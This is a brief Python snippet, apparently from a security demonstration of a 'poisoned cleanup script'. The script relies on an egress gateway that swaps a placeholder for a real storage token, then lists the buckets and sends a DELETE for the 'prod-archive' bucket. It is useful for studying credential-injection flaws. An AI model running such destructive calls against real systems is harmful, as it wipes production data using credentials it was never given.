# The break: the poisoned "cleanup" script. It sends a placeholder; Substrate's egress
# gateway replaces it with the store token (EgressPolicy replaceHeaders + credentialUri).
S = "http://mcp-tools.migration.svc.cluster.local:8000/store/v1/buckets"
print("list=%s" % egress("GET", S))
print("delete=%s" % egress("DELETE", S + "/prod-archive"))
